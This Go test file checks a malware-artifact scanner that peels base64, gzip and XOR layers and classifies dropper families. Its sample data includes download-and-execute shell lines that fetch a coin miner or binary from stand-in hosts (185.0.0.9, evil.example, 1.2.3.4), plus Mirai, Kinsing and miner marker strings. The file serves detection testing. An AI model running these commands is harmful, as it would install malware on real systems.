package artifactscan

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"strings"
	"testing"
)

func TestDeobfuscateBase64RevealsStage2(t *testing.T) {
	inner := "#!/bin/sh\nwget http://185.0.0.9/xmr; chmod +x xmr; ./xmr --coin monero stratum+tcp://pool.evil:3333\n"
	outer := "echo " + base64.StdEncoding.EncodeToString([]byte(inner)) + " | base64 -d | sh\n"
	r := Analyze([]byte(outer))
	if len(r.Deobfuscated) == 0 || r.Deobfuscated[0].Method != "base64" {
		t.Fatalf("expected a base64 layer, got %+v", r.Deobfuscated)
	}
	// The stage-2 URL must surface from the inner layer, not the wrapper.
	foundURL := false
	for _, u := range r.DeobfuscatedIOCs.URLs {
		if strings.Contains(u, "185.0.0.9/xmr") {
			foundURL = true
		}
	}
	if !foundURL {
		t.Errorf("stage-2 URL not recovered: %+v", r.DeobfuscatedIOCs)
	}
	if r.DropperFamily != "coinminer" {
		t.Errorf("dropper family = %q, want coinminer (markers %v)", r.DropperFamily, r.DropperMarkers)
	}
}

func TestDeobfuscateGzip(t *testing.T) {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	_, _ = zw.Write([]byte("GET / HTTP/1.0 download http://evil.example/bot and run\n"))
	_ = zw.Close()
	layers, final := Deobfuscate(buf.Bytes())
	if len(layers) == 0 || layers[0].Method != "gzip" {
		t.Fatalf("expected gzip layer, got %+v", layers)
	}
	if !strings.Contains(string(final), "evil.example/bot") {
		t.Errorf("gzip inner not revealed: %q", final)
	}
}

func TestDeobfuscateXOR(t *testing.T) {
	plain := []byte("#!/bin/sh\nwget http://1.2.3.4/a -O /tmp/a; chmod +x /tmp/a\n")
	key := byte(0x5a)
	enc := make([]byte, len(plain))
	for i, c := range plain {
		enc[i] = c ^ key
	}
	layers, final := Deobfuscate(enc)
	if len(layers) == 0 || !strings.HasPrefix(layers[0].Method, "xor:") {
		t.Fatalf("expected xor layer, got %+v", layers)
	}
	if !strings.Contains(string(final), "1.2.3.4/a") {
		t.Errorf("xor inner not revealed: %q", final)
	}
}

func TestClassifyDropperFamilies(t *testing.T) {
	cases := map[string]string{
		"/bin/busybox MIRAI; cat /dev/watchdog; tsource engine query": "mirai",
		"kdevtmpfsi running from /tmp/kdevtmpfsi.lock":                "kinsing",
		"xmrig --donate-level 1 stratum+tcp://pool.minexmr.com:4444":  "coinminer",
		"PRIVMSG #bots :scanning\nNICK x\nJOIN #channel\nPING :srv":   "irc-bot",
	}
	for data, want := range cases {
		if got, _ := ClassifyDropper([]byte(data)); got != want {
			t.Errorf("ClassifyDropper(%.30q) = %q, want %q", data, got, want)
		}
	}
	// Benign text attributes to nothing.
	if got, _ := ClassifyDropper([]byte("the quick brown fox jumps over the lazy dog")); got != "" {
		t.Errorf("benign text classified as %q", got)
	}
}
